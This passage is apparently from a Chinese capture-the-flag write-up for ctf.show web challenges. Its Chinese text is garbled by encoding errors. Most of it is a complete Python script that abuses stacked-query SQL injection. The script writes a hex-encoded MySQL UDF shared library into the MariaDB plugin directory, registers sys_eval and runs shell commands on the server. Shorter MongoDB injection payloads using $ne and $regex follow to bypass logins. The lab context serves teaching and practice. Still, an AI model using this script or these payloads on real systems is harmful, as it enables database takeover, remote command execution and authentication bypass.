functionï¼‰å¯ç¿»è¯‘ä¸ºç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ï¼Œè¿™ä¸ªæ˜¯ç”¨æ¥æ‹“å±•Mysqlçš„æŠ€æœ¯æ‰‹æ®µã€‚å½“æˆ‘ä»¬æœ‰è¯»å–å’Œå†™å…¥æƒé™ä»¥åï¼Œæˆ‘ä»¬å°±å¯ä»¥å°è¯•ä½¿ç”¨UDFææƒçš„æ–¹æ³•ï¼Œä»æ•°æ®åº“çš„rootæƒé™æå‡åˆ°ç³»ç»Ÿçš„ç®¡ç†å‘˜æƒé™ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">#å‚è€ƒè„šæœ¬</span><br><span class="line">#ç¯å¢ƒï¼šLinux<span class="operator">/</span>MariaDB</span><br><span class="line">import requests</span><br><span class="line"> </span><br><span class="line">url<span class="operator">=</span><span class="string">&#x27;http://89a7098e-03f5-47f3-9cb5-1f1cd3d640e9.challenge.ctf.show:8080/api/?id=&#x27;</span></span><br><span class="line">code<span class="operator">=</span><span class="string">&#x27;7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400&#x27;</span></span><br><span class="line">codes<span class="operator">=</span>[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">0</span>,len(code),<span class="number">128</span>):</span><br><span class="line">    codes.append(code[i:<span class="built_in">min</span>(i<span class="operator">+</span><span class="number">128</span>,len(code))])</span><br><span class="line"> </span><br><span class="line">#å»ºä¸´æ—¶è¡¨</span><br><span class="line"><span class="keyword">sql</span><span class="operator">=</span><span class="string">&#x27;&#x27;&#x27;create table temp(data longblob)&#x27;&#x27;&#x27;</span></span><br><span class="line">payload<span class="operator">=</span><span class="string">&#x27;&#x27;&#x27;0&#x27;</span>;&#123;&#125;;<span class="comment">-- A&#x27;&#x27;&#x27;.format(sql)</span></span><br><span class="line">requests.get(url<span class="operator">+</span>payload)</span><br><span class="line"> </span><br><span class="line">#æ¸…ç©ºä¸´æ—¶è¡¨</span><br><span class="line"><span class="keyword">sql</span><span class="operator">=</span><span class="string">&#x27;&#x27;&#x27;delete from temp&#x27;&#x27;&#x27;</span></span><br><span class="line">payload<span class="operator">=</span><span class="string">&#x27;&#x27;&#x27;0&#x27;</span>;&#123;&#125;;<span class="comment">-- A&#x27;&#x27;&#x27;.format(sql)</span></span><br><span class="line">requests.get(url<span class="operator">+</span>payload)</span><br><span class="line"> </span><br><span class="line">#æ’å…¥ç¬¬ä¸€æ®µæ•°æ®</span><br><span class="line"><span class="keyword">sql</span><span class="operator">=</span><span class="string">&#x27;&#x27;&#x27;insert into temp(data) values (0x&#123;&#125;)&#x27;&#x27;&#x27;</span>.format(codes[<span class="number">0</span>])</span><br><span class="line">payload<span class="operator">=</span><span class="string">&#x27;&#x27;&#x27;0&#x27;</span>;&#123;&#125;;<span class="comment">-- A&#x27;&#x27;&#x27;.format(sql)</span></span><br><span class="line">requests.get(url<span class="operator">+</span>payload)</span><br><span class="line"> </span><br><span class="line">#æ›´æ–°è¿æ¥å‰©ä½™æ•°æ®</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">1</span>,len(codes)):</span><br><span class="line">    <span class="keyword">sql</span><span class="operator">=</span><span class="string">&#x27;&#x27;&#x27;update temp set data = concat(data,0x&#123;&#125;)&#x27;&#x27;&#x27;</span>.format(codes[k])</span><br><span class="line">    payload<span class="operator">=</span><span class="string">&#x27;&#x27;&#x27;0&#x27;</span>;&#123;&#125;;<span class="comment">-- A&#x27;&#x27;&#x27;.format(sql)</span></span><br><span class="line">    requests.get(url<span class="operator">+</span>payload)</span><br><span class="line"> </span><br><span class="line">#<span class="number">10.3</span><span class="number">.18</span><span class="operator">-</span>MariaDB    </span><br><span class="line">#å†™å…¥soæ–‡ä»¶</span><br><span class="line"><span class="keyword">sql</span><span class="operator">=</span><span class="string">&#x27;&#x27;&#x27;select data from temp into dumpfile &#x27;</span><span class="operator">/</span>usr<span class="operator">/</span>lib<span class="operator">/</span>mariadb<span class="operator">/</span>plugin<span class="operator">/</span>udf.so\<span class="string">&#x27;&#x27;&#x27;&#x27;</span></span><br><span class="line">payload<span class="operator">=</span><span class="string">&#x27;&#x27;&#x27;0&#x27;</span>;&#123;&#125;;<span class="comment">-- A&#x27;&#x27;&#x27;.format(sql)</span></span><br><span class="line">requests.get(url<span class="operator">+</span>payload)</span><br><span class="line"> </span><br><span class="line">#å¼•å…¥è‡ªå®šä¹‰å‡½æ•°</span><br><span class="line"><span class="keyword">sql</span><span class="operator">=</span><span class="string">&#x27;&#x27;&#x27;create function sys_eval returns string soname &#x27;</span>udf.so\<span class="string">&#x27;&#x27;&#x27;&#x27;</span></span><br><span class="line">payload<span class="operator">=</span><span class="string">&#x27;&#x27;&#x27;0&#x27;</span>;&#123;&#125;;<span class="comment">-- A&#x27;&#x27;&#x27;.format(sql)</span></span><br><span class="line">requests.get(url<span class="operator">+</span>payload)</span><br><span class="line"> </span><br><span class="line">#å‘½ä»¤æ‰§è¡Œï¼Œç»“æœæ›´æ–°åˆ°ç•Œé¢</span><br><span class="line"><span class="keyword">sql</span><span class="operator">=</span><span class="string">&#x27;&#x27;&#x27;update ctfshow_user set pass=(select sys_eval(&#x27;</span>cat <span class="operator">/</span>flag.her?<span class="string">&#x27;))&#x27;&#x27;&#x27;</span></span><br><span class="line">payload<span class="operator">=</span><span class="string">&#x27;&#x27;&#x27;0&#x27;</span>;&#123;&#125;;<span class="comment">-- A&#x27;&#x27;&#x27;.format(sql)</span></span><br><span class="line">requests.get(url<span class="operator">+</span>payload)</span><br><span class="line"> </span><br><span class="line">#æŸ¥çœ‹ç»“æœ</span><br><span class="line">r<span class="operator">=</span>requests.get(url[:<span class="number">-4</span>]<span class="operator">+</span><span class="string">&#x27;?page=1&amp;limit=10&#x27;</span>)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><h1 id="web249"><a href="#web249" class="headerlink" title="web249"></a>web249</h1><blockquote><p><a href="http://rui0.cn/archives/609">http://rui0.cn/archives/609</a><br><a href="https://www.anquanke.com/post/id/97211">https://www.anquanke.com/post/id/97211</a><br><a href="https://gylq.gitee.io/2021/08/04/%E3%80%90MongoDB%E3%80%91%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/">https://gylq.gitee.io/2021/08/04/%E3%80%90MongoDB%E3%80%91%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/</a></p></blockquote><h2 id="nosql"><a href="#nosql" class="headerlink" title="nosql"></a>nosql</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">user</span> <span class="operator">=</span> $memcache<span class="operator">-</span><span class="operator">&gt;</span><span class="keyword">get</span>($id);</span><br></pre></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">api<span class="operator">/</span>?id[]<span class="operator">=</span>flag</span><br></pre></td></tr></table></figure><h1 id="web250"><a href="#web250" class="headerlink" title="web250"></a>web250</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  $query <span class="operator">=</span> <span class="keyword">new</span> MongoDB\Driver\Query($data);</span><br><span class="line">  $<span class="keyword">cursor</span> <span class="operator">=</span> $manager<span class="operator">-</span><span class="operator">&gt;</span>executeQuery(<span class="string">&#x27;ctfshow.ctfshow_user&#x27;</span>, $query)<span class="operator">-</span><span class="operator">&gt;</span>toArray();</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>æ— è¿‡æ»¤</span><br><span class="line">  if(<span class="built_in">count</span>($<span class="keyword">cursor</span>)<span class="operator">&gt;</span><span class="number">0</span>)&#123;</span><br><span class="line">    $ret[<span class="string">&#x27;msg&#x27;</span>]<span class="operator">=</span><span class="string">&#x27;ç™»é™†æˆåŠŸ&#x27;</span>;</span><br><span class="line">    array_push($ret[<span class="string">&#x27;data&#x27;</span>], $flag);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[$ne]<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>password[$ne]<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>æœ‰çš„æ—¶å€™æœåŠ¡å™¨ä¼šæ‘†ï¼Œé‡å¯ä¸€ä¸‹è¯•è¯•</p><h1 id="web251"><a href="#web251" class="headerlink" title="web251"></a>web251</h1><p>postä¼ å…¥ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[$regex]<span class="operator">=</span>.<span class="operator">*</span><span class="operator">&amp;</span>password[$regex]<span class="operator">=</span>.<span class="operator">*</span></span><br></pre></td></tr></table></figure><h1 id="web252"><a href="#web252" class="headerlink" title="web252"></a>web252</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[$regex]<span class="operator">=</span>f.<span class="operator">*</span><span class="operator">&amp;</span>password[$ne]<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p><img 